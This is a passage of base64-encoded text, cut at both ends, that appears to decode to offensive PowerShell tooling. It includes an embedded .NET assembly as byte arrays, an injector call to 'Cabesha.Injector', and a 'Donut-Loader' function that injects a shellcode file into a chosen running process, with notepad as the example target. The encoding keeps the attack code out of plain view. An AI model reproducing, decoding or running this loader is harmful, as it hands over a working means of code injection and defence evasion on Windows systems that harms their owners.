sIDcwLCAwLCAxMDUsIDAsIDEwOCwgMCwgMTAxLCAwLCA3MywgMCwgMTEwLCAwLCAxMDIsIDAsIDExMSwgMCwgMCwgMCwgOCwgMiwgMCwgMCwgMSwgMCwgNDgsIDAsIDQ4LCAwLCA0OCwgMCwgNDgsIDAsIDQ4LCAwLCA1MiwgMCwgOTgsIDAsIDQ4LCAwLCAwLCAwLCA1NiwgMCwgOCwgMCwgMSwgMCwgNzAsIDAsIDEwNSwgMCwgMTA4LCAwLCAxMDEsIDAsIDY4LCAwLCAxMDEsIDAsIDExNSwgMCwgOTksIDAsIDExNCwgMCwgMTA1LCAwLCAxMTIsIDAsIDExNiwgMCwgMTA1LCAwLCAxMTEsIDAsIDExMCwgMCwgMCwgMCwgMCwgMCwgOTksIDAsIDk3LCAwLCA5OCwgMCwgMTAxLCAwLCAxMTUsIDAsIDEwNCwgMCwgOTcsIDAsIDAsIDAsIDY0LCAwLCAxNSwgMCwgMSwgMCwgNzAsIDAsIDEwNSwgMCwgMTA4LCAwLCAxMDEsIDAsIDg2LCAwLCAxMDEsIDAsIDExNCwgMCwgMTE1LCAwLCAxMDUsIDAsIDExMSwgMCwgMTEwLCAwLCAwLCAwLCAwLCAwLCA0OSwgMCwgNDYsIDAsIDQ4LCAwLCA0NiwgMCwgNTUsIDAsIDQ4LCAwLCA1NiwgMCwgNTEsIDAsIDQ2LCAwLCA0OSwgMCwgNTYsIDAsIDUzLCAwLCA1NCwgMCwgNTAsIDAsIDAsIDAsIDAsIDAsIDU2LCAwLCAxMiwgMCwgMSwgMCwgNzMsIDAsIDExMCwgMCwgMTE2LCAwLCAxMDEsIDAsIDExNCwgMCwgMTEwLCAwLCA5NywgMCwgMTA4LCAwLCA3OCwgMCwgOTcsIDAsIDEwOSwgMCwgMTAxLCAwLCAwLCAwLCA5OSwgMCwgOTcsIDAsIDk4LCAwLCAxMDEsIDAsIDExNSwgMCwgMTA0LCAwLCA5NywgMCwgNDYsIDAsIDEwMCwgMCwgMTA4LCAwLCAxMDgsIDAsIDAsIDAsIDY4LCAwLCAxNSwgMCwgMSwgMCwgNzYsIDAsIDEwMSwgMCwgMTAzLCAwLCA5NywgMCwgMTA4LCAwLCA2NywgMCwgMTExLCAwLCAxMTIsIDAsIDEyMSwgMCwgMTE0LCAwLCAxMDUsIDAsIDEwMywgMCwgMTA0LCAwLCAxMTYsIDAsIDAsIDAsIDY3LCAwLCAxMTEsIDAsIDExMiwgMCwgMTIxLCAwLCAxMTQsIDAsIDEwNSwgMCwgMTAzLCAwLCAxMDQsIDAsIDExNiwgMCwgMzIsIDAsIDUwLCAwLCA0OCwgMCwgNDksIDAsIDU3LCAwLCAwLCAwLCAwLCAwLCA2NCwgMCwgMTIsIDAsIDEsIDAsIDc5LCAwLCAxMTQsIDAsIDEwNSwgMCwgMTAzLCAwLCAxMDUsIDAsIDExMCwgMCwgOTcsIDAsIDEwOCwgMCwgNzAsIDAsIDEwNSwgMCwgMTA4LCAwLCAxMDEsIDAsIDExMCwgMCwgOTcsIDAsIDEwOSwgMCwgMTAxLCAwLCAwLCAwLCA5OSwgMCwgOTcsIDAsIDk4LCAwLCAxMDEsIDAsIDExNSwgMCwgMTA0LCAwLCA5NywgMCwgNDYsIDAsIDEwMCwgMCwgMTA4LCAwLCAxMDgsIDAsIDAsIDAsIDQ4LCAwLCA4LCAwLCAxLCAwLCA4MCwgMCwgMTE0LCAwLCAxMTEsIDAsIDEwMCwgMCwgMTE3LCAwLCA5OSwgMCwgMTE2LCAwLCA3OCwgMCwgOTcsIDAsIDEwOSwgMCwgMTAxLCAwLCAwLCAwLCAwLCAwLCA5OSwgMCwgOTcsIDAsIDk4LCAwLCAxMDEsIDAsIDExNSwgMCwgMTA0LCAwLCA5NywgMCwgMCwgMCwgNjgsIDAsIDE1LCAwLCAxLCAwLCA4MCwgMCwgMTE0LCAwLCAxMTEsIDAsIDEwMCwgMCwgMTE3LCAwLCA5OSwgMCwgMTE2LCAwLCA4NiwgMCwgMTAxLCAwLCAxMTQsIDAsIDExNSwgMCwgMTA1LCAwLCAxMTEsIDAsIDExMCwgMCwgMCwgMCwgNDksIDAsIDQ2LCAwLCA0OCwgMCwgNDYsIDAsIDU1LCAwLCA0OCwgMCwgNTYsIDAsIDUxLCAwLCA0NiwgMCwgNDksIDAsIDU2LCAwLCA1MywgMCwgNTQsIDAsIDUwLCAwLCAwLCAwLCAwLCAwLCA3MiwgMCwgMTUsIDAsIDEsIDAsIDY1LCAwLCAxMTUsIDAsIDExNSwgMCwgMTAxLCAwLCAxMDksIDAsIDk4LCAwLCAxMDgsIDAsIDEyMSwgMCwgMzIsIDAsIDg2LCAwLCAxMDEsIDAsIDExNCwgMCwgMTE1LCAwLCAxMDUsIDAsIDExMSwgMCwgMTEwLCAwLCAwLCAwLCA0OSwgMCwgNDYsIDAsIDQ4LCAwLCA0NiwgMCwgNTUsIDAsIDQ4LCAwLCA1NiwgMCwgNTEsIDAsIDQ2LCAwLCA0OSwgMCwgNTYsIDAsIDUzLCAwLCA1NCwgMCwgNTAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDMyLCAwLCAwLCAxMiwgMCwgMCwgMCwgOTYsIDU3LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwKSkgfCBvdXQtbnVsbCAKJGJpbmFyaW8gID0gJGFyZy5zcGxpdCgiICwiKVswXQokYXJnID0gJGFyZy5SZXBsYWNlKCIkYmluYXJpbyAiLCIiKS5zcGxpdCgiLCIpIHwgU2VsZWN0LU9iamVjdCAtU2tpcCAxCiRhcmd1bWVudG9zID0gJGJpbmFyaW8KZm9yZWFjaCAoJGFyZ3VtZW50byBpbiAkYXJnKSB7ClthcnJheV0kYXJndW1lbnRvcyArPSAkYXJndW1lbnRvCgp9CltDYWJlc2hhLkluamVjdG9yXTo6RXhlY3V0ZSgkYXJndW1lbnRvcyl9Cn0KZnVuY3Rpb24gRG9udXQtTG9hZGVyIHtwYXJhbSgkcHJvY2Vzc19pZCwkZG9udXRmaWxlKQogICAgJGhlbHA9QCIKLlNZTk9QU0lTCiAgICBEb251dCBMb2FkZXIuCiAgICBQb3dlclNoZWxsIEZ1bmN0aW9uOiBEb251dC1Mb2FkZXIKICAgIEF1dGhvcjogTHVpcyBWYWNhcyAoQ3liZXJWYWNhKQogICAgQmFzZWQgY29kZTogVGhlV292ZXIKCiAgICBSZXF1aXJlZCBkZXBlbmRlbmNpZXM6IE5vbmUKICAgIE9wdGlvbmFsIGRlcGVuZGVuY2llczogTm9uZQouREVTQ1JJUFRJT04KICAgIAouRVhBTVBMRQogICAgRG9udXQtTG9hZGVyIC1wcm9jZXNzX2lkIDIxOTUgLWRvbnV0ZmlsZSAvaG9tZS9jeWJlcnZhY2EvZG9udXQuYmluCiAgICBEb251dC1Mb2FkZXIgLXByb2Nlc3NfaWQgKGdldC1wcm9jZXNzIG5vdGVwYWQpLmlkIC1kb251dGZpbGUgL2hvbWUvY3liZXJ2YWNhL2RvbnV0LmJpbgoKICAgIERlc2NyaXB0aW9uCiAgICAtLS0tLS0tLS0tLQogICAgRnVuY3Rpb24gdGhhdCBsb2FkcyBhbiBhcmJpdHJhcnkgZG9udXQgOkQKIkAKaWYgKCRwcm9jZXNzX2lkIC1lcSAkbnVsbCAtb3IgJGRvbnV0ZmlsZSAtZXEgJG51bGwpIHt3cml0ZS1ob3N0ICIkaGVscGBuIn0gZWxzZSAKewppZiAoKFtJbnRQdHJdOjpTaXplKSAtZXEgNCkge3dyaXRlLWhvc3QgIlNvcnJ5LCB0aGlzIGZ1bmN0aW9uIG9ubHkgd29yayBvbiB4NjQgOigiOyBicmVha30KW2J5dGVbXV0kYnl0ZXMgPSA3NywgOTAsIDE0NCwgMCwgMywgMCwgMCwgMCwgNCwgMCwgMCwgMCwgMjU1LCAyNTUsIDAsIDAsIDE4NCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgNjQsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDEyOCwgMCwgMCwgMCwgMTQsIDMxLCAxODYsIDE0LCAwLCAxODAsIDksIDIwNSwgMzMsIDE4NCwgMSwgNzYsIDIwNSwgMzMsIDg0LCAxMDQsIDEwNSwgMTE1LCAzMiwgMTEyLCAxMTQsIDExMSwgMTAzLCAxMTQsIDk3LCAxMDksIDMyLCA5OSwgOTcsIDExMCwgMTEwLCAxMTEsIDExNiwgMzIsIDk4LCAxMDEsIDMyLCAxMTQsIDExNywgMTEwLCAzMiwgMTA1LCAxMTAsIDMyLCA2OCwgNzksIDgzLCAzMiwgMTA5LCAxMTEsIDEwMCwgMTAxLCA0NiwgMTMsIDEzLCAxMCwgMzYsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDgwLCA2OSwgMCwgMCwgMTAwLCAxMzQsIDIsIDAsIDQxLCA2NCwgMTM5LCA5MywgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMjQwLCAwLCAzNCwgMzIsIDExLCAyLCAxMSwgMCwgMCwgMTYsIDAsIDAsIDAsIDE2LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAzMiwgMCwgMCwgMCwgMCwgNjQsIDAsIDAsIDAsIDAsIDAsIDAsIDMyLCAwLCAwLCAwLCAxNiwgMCwgMCwgNCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgNiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgOTYsIDAsIDAsIDAsIDE2LCAwLCAwLCAwLCAwLCAwLCAwLCAzLCAwLCA5NiwgMTMzLCAwLCAwLCA2NCwgMCwgMCwgMCwgMCwgMCwgMCwgNjQsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDE2LCAwLCAwLCAwLCAwLCAwLCAwLCAzMiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMTYsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDY0LCAwLCAwLCA4OCwgMywgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMjAsIDQ1LCAwLCAwLCAyOCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMzIsIDAsIDAsIDcyLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA0NiwgMTE2LCAxMDEsIDEyMCwgMTE2LCAwLCAwLCAwLCA3NiwgMTQsIDAsIDAsIDAsIDMyLCAwLCAwLCAwLCAxNiwgMCwgMCwgMCwgMTYsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDMyLCAwLCAwLCA5NiwgNDYsIDExNCwgMTE1LCAxMTQsIDk5LCAwLCAwLCAwLCA4OCwgMywgMCwgMCwgMCwgNjQsIDAsIDAsIDAsIDE2LCAwLCAwLCAwLCAzMiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgNjQsIDAsIDAsIDY0LCA0NiwgMTE0LCAxMDEsIDEwOCwgMTExLCA5OSwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgOTYsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDQ4LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA2NCwgMCwgMCwgNjYsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsID